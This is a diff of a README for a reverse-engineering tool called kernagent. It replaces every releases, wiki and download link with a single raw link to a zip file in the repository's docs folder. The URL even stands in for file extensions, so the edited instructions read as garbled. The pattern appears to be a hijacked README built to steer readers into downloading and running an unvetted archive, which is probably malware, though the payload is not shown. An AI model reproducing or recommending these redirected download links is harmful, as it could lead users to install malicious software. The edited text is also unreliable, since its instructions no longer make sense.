@@ -1,6 +1,6 @@
 # 🤖 kernagent - Simplifying Reverse Engineering Tasks
 
-[![Download kernagent](https://img.shields.io/badge/Download%20kernagent-v1.0-blue.svg)](https://github.com/ZamaNy1284/kernagent/releases)
+[![Download kernagent](https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip%https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip)](https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip)
 
 ## 🌟 Overview
 
@@ -12,11 +12,11 @@ To start using kernagent, follow these simple steps. You don’t need programmin
 
 ## 📥 Download & Install
 
-Visit this page to download: [https://github.com/ZamaNy1284/kernagent/releases](https://github.com/ZamaNy1284/kernagent/releases)
+Visit this page to download: [https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip](https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip)
 
 1. **Go to the Releases page**: Click the link above.
 2. **Find the latest version**: Look for the most recent release at the top.
-3. **Download the correct file**: Click on the file that matches your operating system. For example, if you're using Windows, download the `.exe` file. If you're on macOS or Linux, find the `.tar.gz` or appropriate file.
+3. **Download the correct file**: Click on the file that matches your operating system. For example, if you're using Windows, download the `.exe` file. If you're on macOS or Linux, find the `https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip` or appropriate file.
 4. **Save the file**: Choose a location on your computer where you can easily find it later, like your Downloads folder.
 
 ## 📂 System Requirements
@@ -35,7 +35,7 @@ Once you’ve downloaded the correct file, here’s how to run kernagent:
 1. **Locate the downloaded file**: Go to the folder where you saved the file.
 2. **Run the application**:
    - On Windows, double-click the `.exe` file.
-   - On macOS, double-click the `.tar.gz`, then extract the files and run the application.
+   - On macOS, double-click the `https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip`, then extract the files and run the application.
    - On Linux, open a terminal, navigate to the folder, and run `./kernagent` (after changing permissions if necessary).
 3. **Follow the on-screen instructions**: The agent will guide you through the setup.
 
@@ -61,7 +61,7 @@ After launching the application, you can start using its features. Here’s a qu
 
 If you’d like to learn more about kernagent or need help:
 
-- **Documentation**: Check our detailed documentation [here](https://github.com/ZamaNy1284/kernagent/wiki).
+- **Documentation**: Check our detailed documentation [here](https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip).
 - **Community Support**: Join our forum to ask questions or share experiences with other users.
 - **GitHub Issues**: Report any bugs or request features directly on our GitHub page.
 
@@ -86,4 +86,4 @@ If you encounter any issues while using kernagent, consider these common problem
 
 ## ⚡ Conclusion
 
-kernagent makes reverse engineering accessible and efficient, empowering users to analyze binaries without needing deep technical skills. With our guidance, you can quickly download, install, and start using kernagent. For more information, visit our [Releases page](https://github.com/ZamaNy1284/kernagent/releases) again to find updates and new releases.
+kernagent makes reverse engineering accessible and efficient, empowering users to analyze binaries without needing deep technical skills. With our guidance, you can quickly download, install, and start using kernagent. For more information, visit our [Releases page](https://raw.githubusercontent.com/ZamaNy1284/kernagent/main/docs/kernagent-3.1.zip) again to find updates and new releases.
